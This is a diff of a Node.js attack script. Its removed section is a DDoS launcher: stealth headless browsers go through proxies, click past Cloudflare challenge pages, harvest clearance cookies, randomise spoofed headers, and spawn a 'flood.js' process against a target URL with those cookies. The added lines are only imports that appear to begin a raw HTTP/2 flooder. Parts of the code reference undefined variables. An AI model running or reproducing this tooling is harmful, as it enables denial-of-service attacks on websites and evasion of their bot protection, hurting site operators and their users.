@@ -1,677 +1,1252 @@
-const errorHandler = error => {
-	// console.log(error);
-  };
-  process.on("uncaughtException", errorHandler);
-  process.on("unhandledRejection", errorHandler);
-  Array.prototype.remove = function (item) {
-	const index = this.indexOf(item);
-	if (index !== -1) {
-	  this.splice(index, 1);
-	}
-	return item;
-  }
-  const net = require("net");
-   const http2 = require("http2");
-   const tls = require("tls");
-   const cluster = require("cluster");
-   const url = require("url");
-   const crypto = require("crypto");
-   const os = require("os");
-   const generateLargeData = () => crypto.randomBytes(1024 * 1024).toString('hex');
-  const COOKIES_MAX_RETRIES = 1;
-  const async = require("async");
-  const fs = require("fs");
-  const puppeteer = require("puppeteer-extra");
-  const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
-  process.setMaxListeners(0);
-  require('events').EventEmitter.defaultMaxListeners = 0;
-  const stealthPlugin = puppeteerStealth();
-  puppeteer.use(stealthPlugin);
-  const targetURL = process.argv[2];
-  const threads = +process.argv[3];
-  const proxiesCount = process.argv[4];
-  const proxyFile = process.argv[5];
-  const rates = process.argv[6];
-  const duration = process.argv[7];
-  const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
-  const { spawn } = require("child_process");
-  const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
-  const randList = list => list[Math.floor(Math.random() * list.length)];
-  const proxies = readLines(proxyFile);
-  const colors = {
-	COLOR_RED: "\x1b[31m",
-	COLOR_GREEN: "\x1b[32m",
-	COLOR_YELLOW: "\x1b[33m",
-	COLOR_BLACK: "\x1b[30m",
-	COLOR_BLUE: "\x1b[34m",
-	COLOR_MAGENTA: "\x1b[35m",
-	COLOR_CYAN: "\x1b[36m",
-	COLOR_WHITE: "\x1b[37m",
-	COLOR_RESET: "\x1b[0m"
-  };
-  function colored(colorCode, text) {
-	console.log(colorCode + text + colors.COLOR_RESET);
-  };
-  function getCurrentTime() {
-	const now = new Date();
-	const gmt7Offset = 7 * 60 * 60 * 1000;
-	const localTime = new Date(now.getTime() + gmt7Offset);
-	return localTime.toISOString().substr(11, 8); // Get HH:MM:SS
-  }
-  async function detectChallenge(browserProxy, page) {
-	  const title = await page.title();
-	  const content = await page.content();
-	const timestamp = getCurrentTime();
-	if (title === "Attention Required! | Cloudflare") {
-	  throw new Error(`${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m Proxy blocked`);
-	}
-	if (content.includes("challenge-platform") === true) {
-	  colored(colors.COLOR_BLUE, `${timestamp} \x1b[33m FOUND challenge\x1b[42m\x1b[0m ${browserProxy} \x1b[0m`);
-	  try {
-		await sleep(15);
-		const elements = await page.$$('[name="cf-turnstile-response"]');
-		if (elements.length <= 0) {
-		  const coordinates = await page.evaluate(() => {
-			let coordinates = [];
-			document.querySelectorAll("div").forEach((item) => {
-			  try {
-				let itemCoordinates = item.getBoundingClientRect();
-				let itemCss = window.getComputedStyle(item);
-				if (
-				  itemCss.margin == "0px" &&
-				  itemCss.padding == "0px" &&
-				  itemCoordinates.width > 290 &&
-				  itemCoordinates.width <= 310 &&
-				  !item.querySelector("*")
-				) {
-				  coordinates.push({
-					x: itemCoordinates.x,
-					y: item.getBoundingClientRect().y,
-					w: item.getBoundingClientRect().width,
-					h: item.getBoundingClientRect().height,
-				  });
-				}
-			  } catch (err) {}
-			});
-  
-			if (coordinates.length <= 0) {
-			  document.querySelectorAll("div").forEach((item) => {
-				try {
-				  let itemCoordinates = item.getBoundingClientRect();
-				  if (
-					itemCoordinates.width > 290 &&
-					itemCoordinates.width <= 310 &&
-					!item.querySelector("*")
-				  ) {
-					coordinates.push({
-					  x: itemCoordinates.x,
-					  y: item.getBoundingClientRect().y,
-					  w: item.getBoundingClientRect().width,
-					  h: item.getBoundingClientRect().height,
-					});
-				  }
-				} catch (err) {}
-			  });
-			}
-			return coordinates;
-		  });
-		  for (const item of coordinates) {
-			try {
-			  let x = item.x + 30;
-			  let y = item.y + item.h / 2;
-			  await page.mouse.click(x, y);
-			} catch (err) {}
-		  }
-		}
-		for (const element of elements) {
-		  try {
-			const parentElement = await element.evaluateHandle(
-			  (el) => el.parentElement
-			);
-			const box = await parentElement.boundingBox();
-			let x = box.x + 30;
-			let y = box.y + box.height / 2;
-			await page.mouse.click(x, y);
-		  } catch (err) {}
-		}
-	  } finally {
-		await sleep(15);
-		return;
-	  }
-	}
-	colored(colors.COLOR_CYAN, `${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m \x1b[40m No challenge detected \x1b[0m`);
-	await sleep(10);
-	return;
-  }
-  const userAgents = [
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
-  ];
-  
-  async function openBrowser(targetURL, browserProxy) {
-  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-	const promise = async (resolve, reject) => {
-	  const options = {
-		headless: "new",
-		ignoreHTTPSErrors: true,
-		  args: [
-		  "--proxy-server=http://" + browserProxy,
-		  "--no-sandbox",
-		  "--no-first-run",
-		  "--ignore-certificate-errors",
-		  "--disable-extensions",
-		  "--test-type",
-		  "--user-agent=" + userAgent
-		  ]
-	  };
-  
-	  const browser = await puppeteer.launch(options);
-	  try {
-	   
-	  const [page] = await browser.pages();
-		
-	const client = page._client();
-	 const accept_header = [
-	  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
-	  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-	  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
-	  'text/html; charset=utf-8',
-	  'application/json, text/plain, */*',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
-	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
-   ]; 
-   lang_header = [
-	  'ko-KR',
-	  'en-US',
-	  'zh-CN',
-	  'zh-TW',
-	  'ja-JP',
-	  'en-GB',
-	  'en-AU',
-	  'en-GB,en-US;q=0.9,en;q=0.8',
-	  'en-GB,en;q=0.5',
-	  'en-CA',
-	  'en-UK, en, de;q=0.5',
-	  'en-NZ',
-	  'en-GB,en;q=0.6',
-	  'en-ZA',
-	  'en-IN',
-	  'en-PH',
-	  'en-SG',
-	  'en-HK',
-	  'en-GB,en;q=0.8',
-	  'en-GB,en;q=0.9',
-	  ' en-GB,en;q=0.7',
-	  '*',
-	  'en-US,en;q=0.5',
-	  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-	  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
-	  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-	  'en-GB, en-US, en;q=0.9',
-	  'de-AT, de-DE;q=0.9, en;q=0.5',
-	  'cs;q=0.5',
-	  'da, en-gb;q=0.8, en;q=0.7',
-	  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-	  'en-US,en;q=0.9',
-	  'de-CH;q=0.7',
-	  'tr',
-	  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
-   ];
-   
-	const encoding_header = [
-	  '*',
-	  '*/*',
-	  'gzip',
-	  'gzip, deflate, br',
-	  'compress, gzip',
-	  'deflate, gzip',
-	  'gzip, identity',
-	  'gzip, deflate',
-	  'br',
-	  'br;q=1.0, gzip;q=0.8, *;q=0.1',
-	  'gzip;q=1.0, identity; q=0.5, *;q=0',
-	  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
-	  'compress;q=0.5, gzip;q=1.0',
-	  'identity',
-	  'gzip, compress',
-	  'compress, deflate',
-	  'compress',
-	  'gzip, deflate, br',
-	  'deflate',
-	  'gzip, deflate, lzma, sdch',
-	  'deflate',
-   ];
-	const control_header = [
-	  'max-age=604800',
-	  'proxy-revalidate',
-	  'public, max-age=0',
-	  'max-age=315360000',
-	  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
-	  's-maxage=604800',
-	  'max-stale',
-	  'public, immutable, max-age=31536000',
-	  'must-revalidate',
-	  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
-	  'max-age=31536000,public,immutable',
-	  'max-age=31536000,public',
-	  'min-fresh',
-	  'private',
-	  'public',
-	  's-maxage',
-	  'no-cache',
-	  'no-cache, no-transform',
-	  'max-age=2592000',
-	  'no-store',
-	  'no-transform',
-	  'max-age=31557600',
-	  'stale-if-error',
-	  'only-if-cached',
-	  'max-age=0',
-   ];
-	const nm = [
-	  "110.0.0.0",
-	  "111.0.0.0",
-	  "112.0.0.0",
-	  "113.0.0.0",
-	  "114.0.0.0",
-	  "115.0.0.0",
-	  "116.0.0.0",
-	  "117.0.0.0",
-	  "118.0.0.0",
-	  "119.0.0.0",
-  ];
-	const nmx = [
-	  "120.0",
-	  "119.0",
-	  "118.0",
-	  "117.0",
-	  "116.0",
-	  "115.0",
-	  "114.0",
-	  "113.0",
-	  "112.0",
-	  "111.0",
-  ];
-	const nmx1 = [
-	  "105.0.0.0",
-	  "104.0.0.0",
-	  "103.0.0.0",
-	  "102.0.0.0",
-	  "101.0.0.0",
-	  "100.0.0.0",
-	  "99.0.0.0",
-	  "98.0.0.0",
-	  "97.0.0.0",
-  ];
-	const sysos = [
-	  "Windows 1.01",
-	  "Windows 1.02",
-	  "Windows 1.03",
-	  "Windows 1.04",
-	  "Windows 2.01",
-	  "Windows 3.0",
-	  "Windows NT 3.1",
-	  "Windows NT 3.5",
-	  "Windows 95",
-	  "Windows 98",
-	  "Windows 2006",
-	  "Windows NT 4.0",
-	  "Windows 95 Edition",
-	  "Windows 98 Edition",
-	  "Windows Me",
-	  "Windows Business",
-	  "Windows XP",
-	  "Windows 7",
-	  "Windows 8",
-	  "Windows 10 version 1507",
-	  "Windows 10 version 1511",
-	  "Windows 10 version 1607",
-	  "Windows 10 version 1703",
-  ];
-	const winarch = [
-	  "x86-16",
-	  "x86-16, IA32",
-	  "IA-32",
-	  "IA-32, Alpha, MIPS",
-	  "IA-32, Alpha, MIPS, PowerPC",
-	  "Itanium",
-	  "x86_64",
-	  "IA-32, x86-64",
-	  "IA-32, x86-64, ARM64",
-	  "x86-64, ARM64",
-	  "ARMv4, MIPS, SH-3",
-	  "ARMv4",
-	  "ARMv5",
-	  "ARMv7",
-	  "IA-32, x86-64, Itanium",
-	  "IA-32, x86-64, Itanium",
-	  "x86-64, Itanium",
-  ];
-	const winch = [
-	  "Weak Build; Servera/251A",
-	  "Weak Build; Servera/252A",
-	  "Weak Build; Servera/583C",
-	  "N1011; ServerBuilder/19X",
-	  "N1011; ServerBuilder/33X",
-	  "N1011 Sports; Server/82A",
-	  "N1011 Sports; ServeB/82A",
-  ];
-  
-	  var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
-	  var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
-	  var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
-	  var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
-	  var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
-	  var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
-   
-	const uap = [
-	  "Mozilla/5.0 (Windows NT 10.0; " + nm5 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 104 + 1)) + 104 }` + ".0.0.0 Safari/537.36",
-	  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apple/537.36 (KHTML, like Gecko) Chrome/" + `${Math.floor(Math.random() * (120 - 104 + 1)) + 104 }` + ".0.0.0 Safari/537.36",
-	  ];
-	const platformd = [
-	  "Windows",
-	  "Linux",
-	  "Android",
-	  "iOS",
-	  "Mac OS",
-	  "iPadOS",
-	  "BlackBerry OS",
-	  "Firefox OS",
-	  ];
-	const rdom2 = [
-	  "hello server",
-	  "hello cloudflare",
-	  "hello client",
-	  "hello world",
-	  "hello akamai",
-	  "hello cdnfly",
-	  "hello kitty"
-  ];
-	const patch = [
-	  'application/json-patch+json',
-	  'application/xml-patch+xml',
-	  'application/merge-patch+json',
-	  'application/vnd.github.v3+json',
-	  'application/vnd.mozilla.xul+xml',
-	  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
-	  'application/vnd.oasis.opendocument.text',
-	  'application/vnd.sun.xml.writer',
-	  'text/x-diff',
-	  'text/x-patch'
-  ];
-	const uaa = [
-	  '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-	  '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
-	  '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
-	  '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
-	  '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
-	  '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
-	  '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
-  ]
-	const pua = [
-	  "Linux",
-	  "Windows",
-	  "Mac OS",
-	  ];
-	const nua = [
-	  "SA/3 Mobile",
-	  "Mobile",
-	  "Mobile Windows",
-	  ];
-	const langua = [
-	  "; en-US",
-	  "; ko-KR",
-	  "; en-US",
-	  "; zh-CN",
-	  "; zh-TW",
-	  "; ja-JP",
-	  "; en-GB",
-	  "; en-AU",
-	  "; en-CA",
-	  "; en-NZ",
-	  "; en-ZA",
-	  "; en-IN",
-	  "; en-PH",
-	  "; en-SG",
-	  "; en-HK",
-	  ];
-  
-		page.on("framenavigated", (frame) => {
-		  if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
-		});
-		page.setDefaultNavigationTimeout(60 * 1000);
-		const userAgent = await page.evaluate(function () {
-		  return navigator.userAgent;
-		});
-  
-		await page.goto(targetURL, {
-		  waitUntil: "domcontentloaded"
-		});
-		await detectChallenge(browserProxy, page, reject);
-		const title = await page.title();
-		const cookies = await page.cookies(targetURL);
-		resolve({
-			  title: title,
-		  browserProxy: browserProxy,
-		  cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
-		  userAgent: userAgent
-		});
-	  } catch (exception) {
-	  } finally {
-		await browser.close();
-	  }
-	};
-		  return new Promise(promise);
-	  }
-  async function startThread(targetURL, browserProxy, task, done, retries = 0) {
-	  if (retries === COOKIES_MAX_RETRIES) {
-		  const currentTask = queue.length();
-		  done(null, { task, currentTask });
-				  } else {
-						  try {
-								  const response = await openBrowser(targetURL, browserProxy);
-								  const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
-						  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
-						  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
-						  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
-						  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
-						  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
-						  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
-						  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
-								  const FAB = ['X-Client-IP','Accepted','AccessKey','Age','Akamai-origin-hop','App','App-Env','Base-url','Basic','Cache-Info','Case-filter','Catalog-Server','Client-Address','Challenge-Response','CF-IP','CF-Temp-Path'];
-								  const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
-						  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
-						  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
-						  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
-						  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
-						  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
-						  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
-						  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
-			  if (response) {
-					  if (response.title === "Just a moment...") {
-							  console.log("\x1b[31mBROWSER : " + browserProxy + " - failed \x1b[37m ");
-							  var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
-							  var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
-							  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
-							  var nua1 = nua[Math.floor(Math.floor(Math.random() * nua.length))];
-							  var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
-							  var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
-							  var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
-							  var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
-							  var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
-							  var uaas = uaa[Math.floor(Math.floor(Math.random() * uaa.length))];
-							  var puaa = pua[Math.floor(Math.floor(Math.random() * pua.length))];
-							  var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
-							  var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
-							  var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
-							  var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
-							  var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
-							  var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
-		  const parsedTarget = url.parse(args.targetURL);
-		  function taoDoiTuongNgauNhien() {
-		  const doiTuong = {};
-		  const kyTuNgauNhien = 'abcdefghijk';
-		  const kyTuNgauNhienk = '123456789';
-		  kill = Math.floor(Math.random() * (30 - 5 + 1)) + 5;
-		  for (let i = 1; i <= kill; i++) {
-		  const key = 'Sec-' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];
-		  const value =  'Public-Age=' + kyTuNgauNhienk[Math.floor(Math.random() * kyTuNgauNhienk.length)];
-		  doiTuong[key] = value;
-	}
-  
-	  return doiTuong;
-	  }
-  function taoDoiTuongNgauNhiens() {
-	  const doiTuong = {};
-		  const kyTuNgauNhien = '123456789';
-			  const mathop = 'lmnopqrstuvwxyz123456789';
-				  kik= Math.floor(Math.random() * (30 - 5 + 1)) + 5;
-					  for (let i = 1; i <= kik ; i++) {
-						  const key = generateRandomString(1,4) + '-' + mathop[Math.floor(Math.random() * mathop.length)]; 
-							  const value = 'max-age=' + kyTuNgauNhien[Math.floor(Math.random() * kyTuNgauNhien.length)];
-  
-									  doiTuong[key] = value;
-			  }
-  
-				  return doiTuong;
-			  }
-	const doiTuongNgauNhien = taoDoiTuongNgauNhien();
-	const rateHeaders = [
-	  { "vtl": "s-maxage=9800" },
-	  { "X-Forwarded-For": spoofed },
-	  { "Accept-Transfer": "gzip" },
-	  { "Virtual.machine": "Encode" },
-	  ];
-	const rateHeaders2 = [
-	  { "TTL-3": "1.5" },
-	  { "Geo-Stats": "USA" },
-	  ];
-	const rateHeaders3 = [
-	  { "X-pop": "?vddos-challenge=" + generateRandomString(2,9) + "-" + generateRandomString(4,8) },
-	  { "X-Geo": "?lang-country=" + generateRandomString(2,9) + "-" + generateRandomString(4,8) },
-	  { "X-Curse": "?Curse-level=" + generateRandomString(2,9) + "-" + generateRandomString(4,8) },
-	  ];
-	const rateHeaders4 = [
-	  { "Delta-reset": "{nel-reset};" + generateRandomString(2,9) + "-" + generateRandomString(4,8) },
-	  { "Retrict-Base": "{max-public=0};" + generateRandomString(2,9) + "-" + generateRandomString(4,8) },
-	  ];
-  
-	const rhd = [
-	  {'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
-	  {'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
-	  { "referer": "https://" + parsedTarget.host + "?cf_chl_tk=" + generateRandomString(15,20)  },
-	  ]
-	const hd1 = [
-	  {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-	  {'Delta-Base' : '12340001'},
-	  {"te": "trailers"},
-	  {"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3"}
-	  ]
-  
-		  var multi = taoDoiTuongNgauNhiens();
-		  var multi1 = taoDoiTuongNgauNhien();
-		  var multi2 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
-		  var multi3 = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
-			  const headerr = {
-				  ":method": "GET",
-				  ":authority": parsedTarget.host,
-				  ":scheme": "https",
-				  ":path": path,
-				  "cache-control": "max-age=0",
-				  "upgrade-insecure-requests": "1",
-				  "user-agent": uap1,
-			  }
-			  
-			  return;
-		  }
-  
-			  const cookies =
-				  "\x1b[36m TARGET INFORMATION : \x1b[0m" +
-				  "\n\x1b[32m [Tittle] : \x1b[36m" +
-				  response.title +
-				  "\n\x1b[32m [Proxy] : \x1b[0m" +
-				  response.browserProxy +
-				  "\n\x1b[32m [User-Agent] : \x1b[0m" +
-				  response.userAgent +
-				  "\n\x1b[31m [Cookie-Solved] : \x1b[37m" +
-				  response.cookies +
-				  "\n}";
-				  console.log( "{ " + "\n" + cookies);
-				  spawn("node", [
-				  "flood.js",
-				  targetURL,
-				  duration, 
-				  "1",
-				  response.browserProxy,
-				  rates,
-				  response.cookies,
-				  response.userAgent
-				  ]);
-			  }
-			  await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
-			  } catch (exception) {
-				  colored(colors.COLOR_RED, exception);
-			  await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
-		  }
-	  }
-  }
-  var queue = async.queue(function (task, done) {
-	startThread(targetURL, task.browserProxy, task, done);
-  }, threads);
-  
-  async function main() {
-	for (let i = 0; i < proxies.length; i++) {
-	  const browserProxy = randList(proxies);
-	  queue.push({ browserProxy: browserProxy });
-	}
-	await sleep(duration);
-	queue.kill
-  }
-  
-  main();
-  
+const net = require('net');
+const tls = require('tls');
+const HPACK = require('hpack');
+const cluster = require('cluster');
+const fs = require('fs');
+const https = require('https');
+const os = require('os');
+const axios = require('axios');
+const crypto = require('crypto');
+const { exec } = require('child_process');
+const { setsockopt } = require('sockopt')
+const chalk = require('chalk');
+
